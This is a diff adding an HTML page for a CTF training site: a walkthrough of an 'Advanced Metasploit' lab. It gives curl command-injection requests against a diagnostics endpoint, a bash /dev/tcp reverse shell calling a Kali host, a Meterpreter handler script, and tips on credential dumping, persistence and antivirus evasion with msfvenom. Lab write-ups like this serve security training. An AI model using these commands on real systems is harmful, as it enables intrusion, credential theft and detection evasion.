@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script>
+    (function() {
+      const path = window.location.pathname.replace(/\\/g, "/");
+      const isLoginPage = path.endsWith("/login/index.html") || path.endsWith("/login") || path.includes("/login/");
+      const isRoomPage = path.startsWith("/room/");
+      if (!isLoginPage && !isRoomPage) {
+        let cached = localStorage.getItem("ctf_active_user_session");
+        if (!cached) {
+          let ca = document.cookie.split(';');
+          for(let i=0; i < ca.length; i++) {
+            let c = ca[i];
+            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+            if (c.indexOf("ctf_active_user_session=") == 0) {
+              cached = c;
+              break;
+            }
+          }
+        }
+        if (!cached) {
+          document.documentElement.style.display = 'none';
+          window.location.href = "/login/index.html";
+        }
+      }
+    })();
+  </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="CTF ARENA Guide — Official walkthrough for the Advanced Metasploit Deep Dive Challenge." />
+  <title>CTF ARENA — Advanced Metasploit Walkthrough</title>
+  <link rel="stylesheet" href="../../../css/global.css" />
+  <link rel="stylesheet" href="../../../css/rules.css" />
+  <style>
+    .code-block {
+      background: #1a252f;
+      color: #3498db;
+      padding: 15px;
+      border-radius: 6px;
+      font-family: monospace;
+      margin: 10px 0 20px 0;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+
+  <!--  NAVBAR  -->
+  <nav class="navbar" aria-label="Main navigation">
+    <a href="http://localhost:8000/index.html" class="logo">CTF<span>ARENA</span></a>
+    <div class="nav-links">
+      <a href="http://localhost:8000/index.html">Home</a>
+      <a href="http://localhost:8000/learn.html">Learn</a>
+      <a href="http://localhost:8000/rules.html">Rules</a>
+      <a href="http://localhost:8000/rooms/index.html">Create Room</a>
+      <div class="dropdown" role="navigation" aria-label="Profile menu">
+        <a href="#" aria-haspopup="true">Profile </a>
+        <div class="dropdown-content" role="menu">
+          <a href="http://localhost:8000/dashboard.html" role="menuitem">Dashboard</a>
+          <a href="http://localhost:8000/settings.html" role="menuitem">Settings</a>
+          <a href="#" role="menuitem">Logout</a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!--  PAGE INTRO  -->
+  <div class="container">
+    <div style="padding: 60px 0 0; text-align:center;">
+      <span class="badge" style="margin-bottom:20px;display:inline-flex;"> Official Walkthrough</span>
+      <h1 style="font-size:clamp(40px,5vw,64px);font-weight:900;color:var(--text-primary);letter-spacing:-2px;margin-bottom:14px;">
+        Advanced Metasploit <span style="color:var(--accent);">Walkthrough.</span>
+      </h1>
+      <p style="color:var(--text-muted);font-size:17px;max-width:600px;margin:0 auto 8px;">
+        A complete step-by-step walkthrough covering the practical exploitation challenge, including reconnaissance, command chaining, and data exfiltration.
+      </p>
+    </div>
+
+    <!--  TWO-COLUMN LAYOUT  -->
+    <div class="rules-section" id="rules-section">
+
+      <!-- Sidebar Nav -->
+      <aside class="rules-nav" aria-label="Guide navigation">
+        <div class="rules-nav-title">Jump to Section</div>
+        <ul>
+          <li><a href="#intro" class="active" id="nav-intro"> Introduction</a></li>
+          <li><a href="#concepts" id="nav-concepts"> 1. Key Concepts</a></li>
+          <li><a href="#exploit" id="nav-exploit"> 2. Practical Exploit</a></li>
+          <li><a href="#advanced" id="nav-advanced"> 3. Advanced Techniques</a></li>
+        </ul>
+      </aside>
+
+      <!-- Guide Content -->
+      <main class="rules-content" id="rules-content">
+
+        <!--  Intro  -->
+        <div class="rules-block" id="intro">
+          <div class="rules-block-header">
+            <div class="block-icon"></div>
+            <div>
+              <h2>Introduction</h2>
+              <p>Advanced Metasploit concepts overview</p>
+            </div>
+          </div>
+          <p style="color: var(--text-muted); line-height: 1.6; font-size: 1.05rem;">
+            Welcome to the Advanced Metasploit Deep Dive! This lab covers post-exploitation with Meterpreter, pivoting & port forwarding, evasion techniques (encoders, packers, custom templates), persistence mechanisms, and resource script automation. The practical challenge uses command injection with multi-stage exploitation.
+          </p>
+        </div>
+
+        <!--  Key Concepts  -->
+        <div class="rules-block" id="concepts">
+          <div class="rules-block-header">
+            <div class="block-icon"></div>
+            <div>
+              <h2>Part 1 — Key Advanced Concepts</h2>
+              <p>What you need to know before the practical</p>
+            </div>
+          </div>
+          <ul class="rule-list">
+            <li class="rule-item">
+              <span class="rule-num">1</span>
+              <span class="rule-text"><strong>Meterpreter.</strong> After exploitation, use <code>migrate</code> for stability, <code>getsystem</code> for privilege escalation, <code>hashdump</code> for credential extraction, and <code>load kiwi</code> for Mimikatz capabilities.</span>
+            </li>
+            <li class="rule-item info">
+              <span class="rule-num">2</span>
+              <span class="rule-text"><strong>Post Modules.</strong> Use <code>post/multi/recon/local_exploit_suggester</code> to find escalation paths, and persistence modules like <code>post/linux/manage/sshkey_persistence</code> for maintained access.</span>
+            </li>
+            <li class="rule-item">
+              <span class="rule-num">3</span>
+              <span class="rule-text"><strong>Pivoting.</strong> Use <code>autoroute</code> to add network routes through compromised hosts, <code>portfwd</code> for direct port tunneling, and <code>auxiliary/server/socks_proxy</code> with <code>proxychains</code> for full network pivoting.</span>
+            </li>
+            <li class="rule-item warn">
+              <span class="rule-num">4</span>
+              <span class="rule-text"><strong>Evasion.</strong> Use <code>msfvenom</code> with the <code>-e x86/shikata_ga_nai</code> encoder and <code>-i</code> for multiple encoding iterations. Use <code>-x</code> to embed payloads in legitimate executables and <code>-k</code> to keep the template functional.</span>
+            </li>
+            <li class="rule-item">
+              <span class="rule-num">5</span>
+              <span class="rule-text"><strong>Resource Scripts.</strong> Create <code>.rc</code> files with Metasploit commands for automation. Use <code>makerc</code> to record sessions. Set global variables with <code>setg</code> to persist across modules.</span>
+            </li>
+          </ul>
+        </div>
+
+        <!--  Exploit Walkthrough  -->
+        <div class="rules-block" id="exploit">
+          <div class="rules-block-header">
+            <div class="block-icon"></div>
+            <div>
+              <h2>Part 2 — Practical Exploitation</h2>
+              <p>Multi-stage exploitation chain via curl</p>
+            </div>
+          </div>
+
+          <ul class="rule-list">
+            <li class="rule-item">
+              <span class="rule-num">Step 1</span>
+              <span class="rule-text"><strong>Start Containers.</strong> Click "Launch Target Server" and "Start Kali Container". Note the Target IP and connect to Kali using <code>docker exec -it [id] bash</code>.</span>
+            </li>
+            <li class="rule-item info">
+              <span class="rule-num">Step 2</span>
+              <span class="rule-text"><strong>Reconnaissance.</strong> Enumerate the target — discover the running user and OS:
+                <div class="code-block">curl http://&lt;TARGET_IP&gt;/
+curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=id"
+curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=uname%20-a"</div>
+              </span>
+            </li>
+            <li class="rule-item">
+              <span class="rule-num">Step 3</span>
+              <span class="rule-text"><strong>Enumerate Files.</strong> Explore the file system to locate the flag:
+                <div class="code-block">curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=ls%20/"
+curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=ls%20/etc/"</div>
+              </span>
+            </li>
+            <li class="rule-item">
+              <span class="rule-num">Step 4</span>
+              <span class="rule-text">
+                <strong>Exploit with Command Chaining.</strong> Use a URL-encoded semicolon (<code>%3B</code>) to chain commands and exfiltrate the flag:
+                <div class="code-block">curl "http://&lt;TARGET_IP&gt;/api/diagnostics?cmd=id%3Bcat%20/etc/flag"</div>
+              </span>
+            </li>
+            <li class="rule-item warn">
+              <span class="rule-num">Step 5</span>
+              <span class="rule-text">
+                <strong>Claim Flag.</strong> The server will execute both commands, returning the flag in the JSON response: <code>FLAG{...}</code>.
+              </span>
+            </li>
+          </ul>
+        </div>
+
+        <!--  Advanced Techniques  -->
+        <div class="rules-block" id="advanced">
+          <div class="rules-block-header">
+            <div class="block-icon"></div>
+            <div>
+              <h2>Part 3 — Advanced Techniques Reference</h2>
+              <p>Techniques for real-world engagements</p>
+            </div>
+          </div>
+          <ul class="rule-list">
+            <li class="rule-item">
+              <span class="rule-num">Tip 1</span>
+              <span class="rule-text"><strong>Reverse Shell.</strong> After confirming command injection, establish a persistent interactive shell:
+                <div class="code-block">Listener:  nc -lvnp 9999
+Injection: cmd=id%3Bbash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/9999%200>%261'</div>
+              </span>
+            </li>
+            <li class="rule-item info">
+              <span class="rule-num">Tip 2</span>
+              <span class="rule-text"><strong>Multi/Handler Automation.</strong> Create a resource script to automate listener setup:
+                <div class="code-block">use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j</div>
+                Save as <code>handler.rc</code> and run with <code>msfconsole -r handler.rc</code>.
+              </span>
+            </li>
+            <li class="rule-item warn">
+              <span class="rule-num">Tip 3</span>
+              <span class="rule-text"><strong>Post-Exploitation.</strong> Once you have a Meterpreter session, immediately <code>migrate</code> to a stable process, run <code>getsystem</code> for privileges, then use <code>post/multi/recon/local_exploit_suggester</code> to find additional escalation paths.</span>
+            </li>
+          </ul>
+        </div>
+
+      </main>
+    </div><!-- /rules-section -->
+  </div><!-- /container -->
+
+  <!--  FOOTER  -->
+  <footer>
+    <p>&copy; 2026 <a href="http://localhost:8000/index.html">CTF ARENA</a> · Internship Project Demo</p>
+  </footer>
+
+  <!-- Active sidebar highlighting on scroll -->
+  <script>
+    const sections = document.querySelectorAll('.rules-block');
+    const navLinks = document.querySelectorAll('.rules-nav a');
+
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          navLinks.forEach(link => {
+            link.classList.toggle('active', link.getAttribute('href') === '#' + entry.target.id);
+          });
+        }
+      });
+    }, { rootMargin: '-30% 0px -60% 0px' });
+
+    sections.forEach(s => observer.observe(s));
+  </script>
+
+
+  <script src="../../../js/firebase-config.js"></script>
+  <script src="../../../js/auth-state.js"></script>
+  <script src="../../../js/analytics-tracker.js"></script>
+
+  <!-- COMPLETION TRACKING INJECTED -->
+  <div style="text-align: center; margin: 40px 0; padding-bottom: 40px;">
+    <button id="btn-complete-guide" onclick="markGuideComplete()" style="background: #2ecc71; color: white; border: none; padding: 12px 24px; font-size: 1.1em; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.3s;">Mark as Complete</button>
+    <p id="completion-msg" style="display:none; color: #2ecc71; font-weight: bold; margin-top: 10px;">✓ Marked as Complete</p>
+  </div>
+  <script>
+    function markGuideComplete() {
+      if(window.ctfTrackCorrect) window.ctfTrackCorrect();
+      if(window.ctfTrackRoomComplete) window.ctfTrackRoomComplete(document.title);
+      document.getElementById('btn-complete-guide').style.display = 'none';
+      document.getElementById('completion-msg').style.display = 'block';
+    }
+  </script>
+
+</body>
+</html>
